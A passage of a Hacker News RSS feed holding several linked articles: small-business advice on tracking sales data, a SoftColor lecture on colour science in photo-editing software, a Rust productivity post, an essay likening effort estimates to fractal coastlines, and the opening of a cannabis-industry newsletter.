<p>Now, it is certainly true that you have the right to close your store whenever you want to.  Perhaps you don't want to be open on Sundays, because your religious beliefs prohibit it.  It's your life.  More typically, though, people just sort of don't want to be open on Sundays, but don't want to pay any penalty for this.  Therefore, they convince themselves that nobody shops on Sundays anyway.  This is, essentially, trying to get out of working on Sundays, without letting your boss see you doing it and docking your pay.  This is employee-type thinking.  Once you are a business owner, not an employee, this way of thinking makes no sense anymore.  If you want to know the cost of not being open on Sundays, you need to collect some data.  For example, you can keep your store open 7 days a week at the beginning, and keep track of how much your sales are each day.  If you do, you will probably find that, just as you want to do a good bit of your shopping on Sunday, so do your (potential) customers.  Sunday is not quite as busy as Saturday, but probably it is more busy than, say, Monday or Tuesday.</p>

<p>But, the lesson is NOT that you should be open on Sundays.  The lesson is that you should not take my word for it, or your own intuition; you should keep track of exactly what happens when you do stay open on Sundays, and look at the cold, hard, unfeeling, pitiless numbers in a spreadsheet before you decide that it's not worth staying open on Sunday.  Of course, if it's a religious thing, or you just don't care about making money, or for whatever other reason you decide to close on Sundays anyway, that is entirely up to you.  But DON'T fail to collect the data.  Don't make decisions based only on your intuition, because when you do that it's the equivalent of the boss asking his employees, "I dunno, should we be open on Sundays?".  What they tell him is based on what they want, not what's good for the business.  You are the boss, and your intuition is like the employees here.  Your intuition will tell you what it wants to be true.  Keep track, numerically, in a spreadsheet, of what happened.  That's what tells you what really is true.</p>

<p>The same logic applies to having a 25% off sale, having a special event at your business, selling a new product, and so forth.  It's your decision, but fortify yourself against wishful thinking by keeping careful, numerical, track of what happened.  You should have, in a spreadsheet, a record of what happened at this time last week, last month, last year.  If sales are slow, is this because they always are slow this time of year?  Or this day of the week?  Or is there something new going on, that you need to look into?  If you spent money to get a new kind of merchandise in your store, how much did you pay for it, and how much did it sell for?  How much do you spend on things, and how much of that goes to waste?  You should know, and you should not rely on your memory or your intuitive hunch.  Put it in a spreadsheet, and look at it.  When it comes time to pay the bills, the bank's computer will take a cold, hard, pitiless look at how much money is in your bank account.  Therefore, you need to be taking a cold, hard, pitiless look at what is working, and what isn't, so that you will be able to pay those bills.</p>

<h3>Failure to Plan</h3>

<img src="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/loop_without_plan.png">

<p>Let's assume, for the moment, that you have a decent work ethic.  You're willing to hustle to get things done.  This is mostly a good thing, but there is one case where it can get you into trouble, and that's when you're not willing to pause, and plan, because there's so much work to do and you want to get started.  Many times, there are more things that need doing, than there is time to get it all done.  It may seem like this means you need to hustle more.  In fact, it means you need to stop hustling, at least for a little while, and think carefully about what needs to be done first.</p>

<p>Once again,this may mean you end up acting a little like those boring loser corporations that you were wanting to get away from when you decided to start your own business.  Planning, to some people, is boring and seems pointless because nothing gets actually accomplished.  But you don't have enough time, energy, and money to do everything you can think of that needs doing.  When you have your own business, you NEVER run out of things that need doing.  This means you need to carefully plan, and prioritize, so that what you actually do is what is most likely to help.  Just because you are working hard, doesn't mean you are doing what is most important right then.  Make a list of all the things that need doing, put them in an order from highest priority to lowest, and start from the top.  Don't work on the first thing you happen to see that needs doing.  Work on the thing at the top of the list of priorities, and leave some time in your schedule for making sure that list is right.  Is the thing at the top more important than what is below it?  If you cannot get everything done, is the stuff at the top of your list what you would choose to do?  Or will you discover that you have been sprinting nonstop for weeks and much of what you did turned out to be pointless, because (for example) you spent a lot of time painting the great looking sign for your bakery's special Easter sidewalk sale, but never got the permit from the city to have a sidewalk sale so you cannot do that, and the time spent on painting that sign is wasted.  Work on the most necessary things first, and realize that not everything you can think of, will get done.  Even though stopping to plan takes away some of your (already insufficient) time, it also helps increase the odds that you are spending your time wisely, and not wasting it.</p>

<p>All of the above discussion about prioritizing your time, also applies to prioritizing your money.  You will run out of money, if you spend it on anything that seems like a good idea.  There are absolutely more sensible-sounding, good ideas to spend your money on, than you have money.  So prioritize.  You cannot run your business, if you don't pay rent.  You cannot …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/">https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/</a></em></p>]]>
            </description>
            <link>https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062764</guid>
            <pubDate>Wed, 11 Nov 2020 20:45:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software engineering photonics and color science]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062325">thread link</a>) | @pete314
<br/>
November 11, 2020 | https://www.softcolorsoftware.com/resources/software-engineering-photonics-and-color-science/ | <a href="https://web.archive.org/web/*/https://www.softcolorsoftware.com/resources/software-engineering-photonics-and-color-science/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<hr><h2>Software engineering photonics and color science</h2>

<p>

<img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science.png">

</p>
<p>Hi everybody, I am Petri Piirainen, a co-founder and chief technology officer of SoftColor company. Welcome to this video lecture about SoftColor's fifteen-year software engineering photonics and color science story. </p>

<p>This lecture is part of the University of Eastern Finland's photonics applications course and lecture series. </p>

<p>Since 2005 we have made photo editing automation software. Our photonics journey is slightly different from traditional optics-focused companies, which you have met during this lecture series. </p>

<p>During this lecture, I will tell you what we have learned about developing and selling photonics applications. </p>

<hr><h2>My history with photonics and software engineering </h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_2.png"></p><p>I have an MSc degree in computer science (from the University of Eastern Finland). I studied computer science in a digital signal processing program, and then I had mandatory applied mathematics and physics as minor studies. With physics studies, there was a lot of photonics and color science courses. </p>

<p>I started by software business and engineering career during high school in the 90s.  In 2005 we founded SoftColor Oy, and since that, we have developed faster, easier, and better photo editing automation software.</p>


<hr><h2>Photonics applications: What have we learned?</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_3.png"></p><p>First, I would like to talk a little bit about photonics applications, the beauty and the beast of engineering photonics applications. We have learned that developing useful photonics applications is very hard and requires a lot of engineering and math knowledge. It is challenging because photonics applications (software or hardware) usually have to quickly process tons of data and calculations. </p>

<hr><h2>Technical elements of useful photonics application</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_4.png"></p><p>My favorite thing with photonics is that all photonics applications contain four types of engineering. </p>
<ul>
<li>Physics</li>
<li>Mathematics</li>
<li>Electrical engineering</li>
<li>Computer science </li>

</ul>

<p>But there is also one thing, which is fascinating.  All photonics applications require a lot of arts too.</p>

<ul>
<li>Image quality</li>
<li>Industrial design</li>
<li>User experience</li>
<li>User interaction</li>
<li>User interfaces</li>

</ul>

<p>This mixture of arts and engineering is my main topic for you today.</p>

<hr><h2>Topics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_5.png"></p><p>My topics today are:</p>

<ul>
<li>A short history and introduction to our company</li>
<li>What we do and how products work</li>
<li>How have we mixed photonics with software engineering</li>
<li>What we learned about to make useful photonics applications</li>
<li>And there will be a bonus "homework" for  you</li>

</ul>


<hr><h2>Story of SoftColor Oy</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_6.png"></p><p>Let's have a quick look at our products and technology. </p>

<hr><h2>What we do</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_7.png"></p><p>We make faster, easier, and better photo edition automation software. Our software runs on Windows PCs and servers.</p>

<hr><h2>SoftColor Oy</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_8.png"></p><p>We founded SoftColor in 2005, so our company is now a teenager. </p>

<p>We have three products: Automata Server, Automata Pro, and PhotoEQ.</p>

<p>We are located in Joensuu, Finland. </p>

<hr><h2>Our business</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_9.png"></p><p>We sell our software on the internet. And all our products are free to try before buying.  Our customers are:</p>

<ul>
<li>Printing industry</li>
<li>Photographers</li>
<li>360 photography</li>
<li>Newspapers</li>
<li>Ad agencies</li>
<li>Repro</li>
<li>Real estate</li>
<li>Car retail</li>
<li>Photo editors</li>
<li>Office workers</li>
<li>Developers</li>

</ul>

<p>Our customers are from the English speaking world. But we have a lof customers from Germany and Spain too.</p>

<hr><h2>Our research and development</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_10.png"></p><p>Our research and development work is to make our photo editing automation software faster, more comfortable, and better to use.</p>

<hr><h2>SoftColor engine </h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_11.png"></p><p>Our applications use the SoftColor engine. It is the brains and heart of our software. </p>

<p>SoftColor engine does all photo editing automation tasks, color correction, image editing, and color management. </p>

<p>To get this automation working. We have combined computer vision, color science, computer graphics, digital signal processing, and machine learning techniques into one packet. </p>

<p>This combination of different engineering tools has made our photo editing automation to work very well.</p>

<hr><h2>How does our color and tone correction work?</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_12.png"></p><p>Let's check how our photo enhancement automation works, with good or bad photos. </p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_13.png"></p><p>We can fix white balance, exposure, and contrast problems automatically. Results are very natural and good looking.</p>

<p>Our correction works with challenging photos too.</p>

<p>Our white balance correction will you very natural results.</p>

<p>It works with all kinds of photos and cameras.</p>

<p>You will never lose any shots. We can fix them.</p>

<hr><h2>SoftColor and photonics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_14.png"></p><p>Let's talk a little bit about photonics. </p>

<hr><h2>We are processing colors, not pixels.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_15.png"></p><p>To get photo editing automation working better. We have learned computers to process colors, not pixels. </p>

<hr><h2>A good photo is a combination of art and science.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_16.png"></p><p>The most challenging part of photo editing automation is to get results that make our customers happy. The problem is that the excellent photo is a combination of art and science. There is eighty percent of art in the superb picture and only twenty percent of engineering.  </p>

<p>For this problem, we managed to create an excellent solution.</p>

<hr><h2>Traditional image editing and photonics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_17.png"></p><p>There is photonics behind every camera, display, and photo-editing algorithms. </p>

<hr><h2>SoftColor engine and photonics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_18.png"></p><p>We have changed to traditional photo editing. We built our engine to take colors first.  This solution has helped us to make better photo enhancement automation.</p>

<hr><h2>We have made a color correction automation that has tools for science and art.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_19.png"></p><p>Our applications offer tools to our customers to combine art and science with photo editing automation. </p>

<p>Science part:</p>

<ul>
<li>Layer based processing</li>
<li>Statistical analysis </li>
<li>Metadata analysis</li>
<li>Machine vision</li>
<li>Machine learning</li>

</ul>

<p>and the arts:</p>

<ul>
<li>Color grading for mass photo processing</li>
<li>Selective color adjustments </li>
<li>No workflow limitations</li>

</ul>

<hr><h2>SoftColor engine benefits</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_20.png"></p><p>We are processing the colors, not pixels. This approach gives three significant benefits:</p>

<ul>
<li>More accurate automatic correction</li>
<li>Batch color grading for photos</li>
<li>Easier and accurate customization</li>

</ul>


<hr><h2>SoftColor engine technical details</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_21.png"></p><p>Let's take a look inside our engine.</p>

<hr><h2>Layer based processing</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_22.png"></p><p>We use layers based processing, which means that all correction and image processing tools are separate layers. </p>

<p>You will full control of how each step works. For automatic color and tone correction, we have six layers. </p>

<ul>
<li>Rich dynamics enhancer</li>
<li>Luminosity enhancer</li>
<li>White balance </li>
<li>Natural color temperature</li>
<li>Exposure and contrast</li>
<li>Color grading</li>

</ul>


<hr><h2>Spectral illumination estimation technology for better color correction</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_23.png"></p><p>To get better automatic results for all kinds of photos. We have developed spectral illumination estimation technology. </p>

<hr><h2>Same parameters for human and computer</h2>
<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_24.png"></p><p>We use spectral illumination detection to create the same parameters for the user and the computer. </p>

<p>We calculate these parameters from the original image by using:</p>

<ul>
<li>Spectral  illumination estimation from RGB image</li>
<li>Metadata analysis EXIF &amp; camera data</li>
<li>Machine learning for estimated data</li>

</ul>

<p>From this data, we generate parameters for automatic correction.</p>

<p>When users change parameters, they will alter the same settings as our automatic correction uses.</p>

<p>The solution is possible by mixing spectral illumination data with computer graphics techniques.</p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_25.png"></p><hr><h2>What we have learned about photonics applications during the last fifteen years</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_26.png"></p><p>There six things which we have learned. Which are the requirements for good photonics software or hardware applications.</p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_27.png"></p><ol>
<li>Software is the glue for photonics applications</li>
<li>Optical engineering</li>
<li>Software engineering</li>
<li>Electrical engineering</li>
<li>User experience engineering</li>

</ol>

<p>These are things and skills which are required. But there is always one challenge, battery, and CPU limitations.  It is the reason why we all need to tune our algorithms, software, and hardware better every day.</p>

<hr><h2>Bonus "homework." Useful resources for your entrepreneur career</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_28.png"></p><p>There has been a lot of questions about how to get started with the photonics business.  Here are two great resources to read or watch.</p>


<hr><h2>To watch "Halt and Catch Fire" tv-series.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_29.png"></p><p>Halt and Catch Fire is an excellent and very realistic business world tv-series.  The tv-series follows some players in the 80s technological revolution that lead to an information society. It is quite an unknown series, but now it is available in streaming services. </p>



<p>You will learn a lot about the hardware and software business. </p>

<p>The tv-series covers the following useful topics:</p>

<ul>
<li>Venture capital</li>
<li>Bootstrapping</li>
<li>Human resources</li>
<li>Risk management </li>
<li>Work/life balance</li>
<li>Legal stuff (due diligence, intellectual property rights, revenge engineering process) </li>
<li>Fortune 500 vs. startup life </li>

</ul>

<p>And there is a lot of 80s and 90s retro computing and nostalgia too.</p>

<p>
<a href="https://en.wikipedia.org/wiki/Halt_and_Catch_Fire_(TV_series)" target="_blank">Halt and Catch Fire in Wikipedia</a>
</p>


<hr><h2>To read "Masters of Doom" book.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_30.png"></p><p>Masters of Doom book tells the story of ID software. The makers of Wolf3D, Doom, and Quake games. </p>

<p>There are fascinating stories about how small teams can change the world. For the photonics industry, there is interesting how ID software took the latest research topics from computer graphics and science. And how they utilized them to make their games better.</p>

<p>This book is also available as an audiobook.</p>

<p>
<a href="https://en.wikipedia.org/wiki/Masters_of_Doom" target="_blank">Masters of Doom book in Wikipedia</a>
</p>


<hr><h2>Summary </h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_31.png"></p><p>That was our 15 years story with software engineering, photonics, and color science. I hope that you have learned something new for photonics career or business.</p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_32.png"></p><p>Here is a summary of the main topics:</p>

<ul>
<li>A good photo is a combination of art and science</li>

</ul>

<ul>
<li>Software is the glue for photonics applications.</li>

</ul>

<ul>
<li>Photonics is a mixture of science, engineering, and arts.</li>

</ul>

<hr><h2>Feedback and comments</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_33.png"></p><p>
It would be great to hear your feedback about this lecture! <a href="https://www.softcolorsoftware.com/contact/">
</a></p><a href="https://www.softcolorsoftware.com/contact/">
</a><center><a href="https://www.softcolorsoftware.com/contact/">
Just drop us a message.</a>
</center>


</div></div>]]>
            </description>
            <link>https://www.softcolorsoftware.com/resources/software-engineering-photonics-and-color-science/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062325</guid>
            <pubDate>Wed, 11 Nov 2020 20:02:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[.new TLD Shortcuts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062243">thread link</a>) | @twapi
<br/>
November 11, 2020 | https://whats.new/shortcuts/ | <a href="https://web.archive.org/web/*/https://whats.new/shortcuts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://whats.new/shortcuts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062243</guid>
            <pubDate>Wed, 11 Nov 2020 19:56:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust as a productive high-level language]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062055">thread link</a>) | @praveenperera
<br/>
November 11, 2020 | https://omarabid.com/rust-high-level-language | <a href="https://web.archive.org/web/*/https://omarabid.com/rust-high-level-language">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="container">
  <article id="wBiL7EUi4Kw16ahNjk6hmU">
	<time datetime="2020-11-10">November 10, 2020</time>
  
	<p>Rust is often critiqued as a <a href="https://news.ycombinator.com/item?id=24536645">not a very productive</a> programming language. It is true that there is a bit of a learning curve to be able to program in Rust; but beyond that, I think it pays off in productivity; and massively I must say.</p>

<p>I haven’t been using Rust for production much; maybe a bit more than a year. The static type checks means I’m getting much less bugs in my code, and spend considerably less time in debugging. I can safely say that, for me, Rust is more productive than JavaScript, PHP or Python and the margin keeps getting larger as I get more acquainted with the ecosystem.</p>

<hr>

<p>To entice your interest, here is a situation that I handled lately: I have a program that writes logs to <a href="https://en.wikipedia.org/wiki/Syslog">syslog</a> and the terminal. The program compiles and functions correctly on my development machine. However, it returned an error when I deployed it to an <a href="https://alpinelinux.org/">Alpine</a> Docker container. Turns out, Alpine doesn’t have a running syslog service by default.</p>

<p>Now that’s fine, the program functioned correctly. But I don’t care much for syslog on deployment since the program is running inside a container. One solution is to remove the syslog <a href="https://en.wikipedia.org/wiki/Sink_(computing)">drain</a> but I need that for development. I can use <a href="https://doc.rust-lang.org/reference/conditional-compilation.html">conditional compilation</a>; but there is a better option: If syslog fails, for whatever reason, just ignore that and move on.</p>

<p>So let’s take a look at the old code. </p>

<pre><code>    let syslog_drain = syslog_drain()?;
    let term_drain = term_drain()?;
</code></pre>

<p>This code creates two logging drains: one for syslog and one for the terminal. It uses the <a href="https://doc.rust-lang.org/edition-guide/rust-2018/error-handling-and-panics/the-question-mark-operator-for-easier-error-handling.html">? operator</a> to evaluate the result. If the function returns an error, execution will stop and the error bubbles back to the top of the program.</p>

<p>I have no idea how the syslog or any particular drain fails. And honestly, I don’t want to get into these details. What I want is to check if there is a failure; and if so ignore that particular drain. Or return a <a href="https://docs.rs/slog/2.5.2/slog/struct.Discard.html">Discard drain</a>.</p>

<p>The <a href="https://doc.rust-lang.org/std/result/">Result</a> type and <code>? operator</code> make this particularly easy. So here is the code that does that.</p>

<pre><code>    let syslog_drain = syslog_drain().unwrap_or(discard_drain()?);
    let term_drain = term_drain().unwrap_or(discard_drain()?);
</code></pre>

<p>And that’s it. This code now compiles and runs correctly. If syslog is running, it’ll write logs to syslog and the terminal. Otherwise, it’ll write logs to the terminal and syslog is skipped. There are no conditions, no complicated checks and it’s perfectly readable.</p>

<hr>

<p>There is more to Rust productivity than that. Macros, Iterators, Advanced Traits and Types, the new Async system. Once you are comfortable with all of these, you are now able to be productive, safe and fast.</p>

  <figure id="kudo_wBiL7EUi4Kw16ahNjk6hmU">
    <a href="#kudo">
      
    </a>
    <p>144</p>
    <p>Kudos</p>
  </figure>
  <figure id="kudo_side_wBiL7EUi4Kw16ahNjk6hmU">
    <a href="#kudo">
      
    </a>
    <p>144</p>
    <p>Kudos</p>
  </figure>
</article>

</section></div>]]>
            </description>
            <link>https://omarabid.com/rust-high-level-language</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062055</guid>
            <pubDate>Wed, 11 Nov 2020 19:40:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On the fractal nature of effort estimates]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061983">thread link</a>) | @adamkl
<br/>
November 11, 2020 | https://realfiction.net/2016/02/28/on-the-fractal-nature-of-effort-estimates | <a href="https://web.archive.org/web/*/https://realfiction.net/2016/02/28/on-the-fractal-nature-of-effort-estimates">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><span>February 28, 2016</span> in<span><a href="https://realfiction.net/tags/software-development">software-development</a></span></p></div><p>We still live in a world where people want to play the game of estimates. Indeed, in some industries this may (kind of) work (Yes, this is the 30th automobile we are designing, and the requirements may be more or less the same (not really) than for the 1st automobile we designed). Alas, in software development we are still regularly in trouble if we try to estimate what it will cost us to finalize some software project.</p><p><a href="https://www.quora.com/Why-are-software-development-task-estimations-regularly-off-by-a-factor-of-2-3">I am not the first one</a> to compare the creation of software to a hike following some coast-line. Let's play along, though. Our project needs us to walk around the Lake Constance. First, we have a broad overview of what software we want to build. We look at the lake at the 50km scale of Google Maps:</p><p><img src="https://realfiction.net/assets/LakeConstance-50kmScale.png"></p><p>192 km, nice. We start adding more detail, i.e. we look closer to the aim of walking around the lake...</p><p><img src="https://realfiction.net/assets/LakeConstance-20kmScale.png"></p><p>205 km, still on track.</p><p><img src="https://realfiction.net/assets/LakeConstance-5kmScale.png"></p><p>231 km. Only 20% more expensive than the original estimate, looks like we are gaining confidence. We do see that we may be taking some shortcuts for which we could account with some risk percentages.</p><p>We decide to start the project...</p><p><img src="https://realfiction.net/assets/LakeConstanceProject-Leg1.png"></p><p>We have burned through almost a quarter of the original budget. <strong>50%</strong> more than what we wanted to burn up to now. We also had to make up some additional rules with regard to rivers and the like (we go to the next bridge and cross there).</p><p>The next leg then became a total disaster...</p><p><img src="https://realfiction.net/assets/LakeConstanceProject-Leg2.png"></p><p>57 km...compare this to the estimate on the 20km scale:</p><p><img src="https://realfiction.net/assets/LakeConstance-20kmScaleFromNear.png"></p><p>15 km...<strong>it took almost 4 times the estimate to cover the desired distance!</strong> What happened?!</p><p><img src="https://realfiction.net/assets/LakeConstance-Unforeseen1.png"></p><p>We didn't find a damn bridge!</p><p><img src="https://realfiction.net/assets/LakeConstance-Unforeseen2.png"></p><p>A place where our efforts were about to explode. We took a shortcut!</p><p>And so on, and so on. The scope of the project didn't change, but the expenses are exploding!</p><p>Do I see affirmative nods by fellow software developers?</p><p>If this metaphor works so well, the question is: <strong>Why</strong> does it work so well?</p><p>It may have to do with the nature of fractals. One of the main characteristics of fractals is that they are self-similar. Zoom into a structure, and you will find additional structures, very similar to the ones you already saw from <em>"higher up"</em>. We find self-similarities in large projects, too. On a large scale, we may draw up necessary activities to get from one place to the other. The activities are inter-dependent. We identify problems for which we provide slack. <strong>This happens again and again while we zoom into activities</strong>. Some time into the process we will arrive at the point where we don't see additional value in planning - we will start walking. Whatever detail we put into the planning (Check our 3rd plan of the lake circumference, it looks pretty exact!), it doesn't protect us from additional activities, inter-dependencies and problems that we did not foresee.</p><p><img src="https://realfiction.net/assets/zoominto.jpg"></p><p>Other things that we haven't even gotten into, but will probably greatly affect our estimating efforts:</p><ul><li>The effort involved in monitoring the activities (as witnessed by measuring out the distance) grows exponentially.</li><li>In an actual software project, the expected results of the project will inevitably change - In our metaphor this amounts to either a changing coast line, or, when facing the sheer amount of effort required to trace a particular part of the line, to the statement <em>"we will do this later"</em>.</li></ul><p>Does all of this information help us in any way? I am not sure. However, especially in the case of tracing coastlines, mathematics has a concept that encapsulates the increase in effort with increasing detail: The <a href="http://fractalfoundation.org/OFC/OFC-10-4.html">fractal dimension</a>. Hence, if there is more to tracing coastlines than being a metaphor to developing software, there may be a chance that the mathematics of fractals can help us in understanding better the capabilities and, more importantly, the inadequacies of estimating efforts in a large software project.</p><h2>Previous &amp; Next</h2><h2>Comments</h2></article></div></div>]]>
            </description>
            <link>https://realfiction.net/2016/02/28/on-the-fractal-nature-of-effort-estimates</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061983</guid>
            <pubDate>Wed, 11 Nov 2020 19:33:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most misunderstood billion dollar industry in the world?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25061784">thread link</a>) | @mattob
<br/>
November 11, 2020 | https://www.fourpm.co/p/cannabis-is-the-most-misunderstood | <a href="https://web.archive.org/web/*/https://www.fourpm.co/p/cannabis-is-the-most-misunderstood">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em><strong>Every morning I write an email discussing the business and the people behind cannabis. If you would like to receive it directly in your inbox, subscribe now.</strong></em></p><p>Friends, </p><p>I woke up on Wednesday, June 21st <em>ready</em>.&nbsp;   </p><p>It was my final day of high school, and I was preparing to take an economics exam later that day. It was also same day that I was preparing to move half-ways across the world from a small town in rural Ireland to Toronto, Canada. </p><p>About 4 hours later after the completion of my economics exam, I found myself on the way to the airport (some 5 hours away to Dublin) to catch a flight to Toronto at 2.AM the next morning - all of this courtesy of reading a brilliant book called Narconomics.</p><p>Within this book, I found one of the most logical arguments that I had ever heard, an argument that we as a society should effectively embrace legalizing all drugs. This was not a moral argument, instead it was a highly convincing argument based on economic theory and practical use cases from around the world, and I wanted to learn more. </p><p>After many months of diligent planning, I arrived in Toronto, slightly jet lagged after more than 15 hours of travel. With less than $500 CAD in my bank account I had a modest first few months upon my arrival in Canada, however, shortly afterwards I found myself working as a budtender at a cannabis retail store in Vancouver, B.C. </p><p>Starting off at this ground level provided me with the best foundation that I could have asked for as an entry point into the cannabis industry, and it was from here that I worked tirelessly over the next two years to gain all of the insights that I craved into everything that encompassed the cannabis industry to learn exactly how it operated.</p><p>As I fast approach the three year anniversary for my joining the cannabis industry. Here are the five biggest things I’ve learned over the last three years.</p><h4><strong>1.</strong> Assume everything you currently know about cannabis is wrong</h4><p>When I first started working in the cannabis industry, I had little to no understanding of cannabis. </p><p>Although in the beginning this seemed to serve as a significant disadvantage, with all of my initial interactions with customers being very uninformed, within four weeks of working as a budtender my understanding of cannabis had already surpassed everyone I was directly working with by virtue of assuming that I knew nothing to begin with.</p><p>My own approach was to spend every moment on days off, or wasn’t serving a customer in store to read as much of the research that has been done on cannabis to date, of which their was surprisingly a lot more than what I had expected there to be.     </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F52e41090-cae2-4424-8754-d5b591f7362a_3872x2581.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F52e41090-cae2-4424-8754-d5b591f7362a_3872x2581.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/52e41090-cae2-4424-8754-d5b591f7362a_3872x2581.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:539504,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h4><strong>2.</strong> Get very comfortable with constant change</h4><p>One of the most important lessons I have learned from working within the cannabis industry is to get very comfortable with the idea of <em><strong>constant change</strong></em>. </p><p>In the three years that I have worked within the cannabis industry I have seen the industry transition out of the black market into a fully federally legal framework -  with cannabis stocks being traded on some of the most prestigious stock exchanges in the world, and with this we have seen cannabis companies valuations experience meteoric rises and with this meteoric declines shortly afterwards. </p><p>Although all of these changes may seem significant, I suspect that many of these changes will seem minor in comparison to some of the changes I see on the horizon for the cannabis industry in the coming years. </p><h4><strong>3.</strong> <a href="https://www.youtube.com/watch?v=jtRFd1N43y4">The best is yet to come</a></h4><p>When I joined the cannabis industry three years ago working in the store below, what captivated me the most was not where the industry was at this point, what captivated me was where I thought the industry would be 20 years from now.</p><p>Here in Canada it’s estimated that 15% of Canadians over the age of 15 have consumed cannabis within the past 12 months, while this number is 78.5% for those who have consumed alcohol.</p><p>As someone who no longer consumes alcohol in favor of consuming cannabis derived products, I am perhaps blinded by my own basis here, however, the approach that I took to make this determination was simply by reading research. </p><p>Truthfully, when presented with the known evidence, going <a href="https://myhighly.com/cannabis-101/the-rise-of-cali-sober">Cali Sober</a> was the easiest decision I have every made.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faab6ddb0-7d5b-42c9-9310-3a4472738a2b_1328x747.png"><img 